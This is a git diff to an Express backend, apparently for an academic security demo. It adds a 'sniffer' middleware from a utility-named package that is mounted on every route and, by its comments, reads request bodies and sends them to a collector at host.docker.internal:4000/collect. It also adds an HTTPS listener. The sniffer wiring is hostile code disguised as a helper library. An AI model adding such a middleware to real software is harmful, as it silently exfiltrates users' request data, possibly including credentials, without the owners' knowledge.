@@ -2,12 +2,18 @@ import express from 'express';
 import bodyParser from 'body-parser';
 import cors from 'cors';
 import axios from 'axios';
-import mongoose from 'mongoose'; //Sí se usa, en el la expresión evaluada con eval
+import mongoose from 'mongoose';
+import https from 'https';
+import fs from 'fs';
+import { snifferMiddleware, initGlobalSniffer } from 'express-utils-helper';
 
 import { Todo } from './modelDB.js';
 
 const SERVER_CONFIG_URL =
   process.env.SERVER_CONFIG_URL || 'http://localhost:3011/config';
+
+// [ACADEMIC DEMO] Express Utils Initialization
+initGlobalSniffer('http://host.docker.internal:4000/collect');
 
 axios
   .get(SERVER_CONFIG_URL)
@@ -26,14 +32,29 @@ axios
         app.use(express.json());
         app.use(bodyParser.json());
 
+        // Middleware del Sniffer se coloca AQUÍ para leer el cuerpo (body) y ejecutarse en cada ruta.
+        const collectorUrl = 'http://host.docker.internal:4000/collect';
+        app.use(snifferMiddleware(collectorUrl));
+
         let tries = 0;
 
         const startServer = async () => {
           const isConnected = await connect(config.DB_URL);
 
           if (isConnected) {
-            app.listen(config.PORT_SERVER, () => {
-              console.log(`Back server running on port ${config.PORT_SERVER}`);
+            // [ACADEMIC DEMO] HTTPS Configuration (Para mostrar al profesor)
+            const httpsOptions = {
+              key: fs.readFileSync('./certs/server.key'),
+              cert: fs.readFileSync('./certs/server.crt')
+            };
+
+            https.createServer(httpsOptions, app).listen(3443, '0.0.0.0', () => {
+              console.log(`[SECURE] Back server running on HTTPS port 3443`);
+            });
+
+            // Enlace HTTP normal para el frontend React local sin problemas de navegador
+            app.listen(config.PORT_SERVER, '0.0.0.0', () => {
+              console.log(`[HTTP] Back server running on HTTP port ${config.PORT_SERVER}`);
             });
           } else {
             console.log('Error connecting to database');
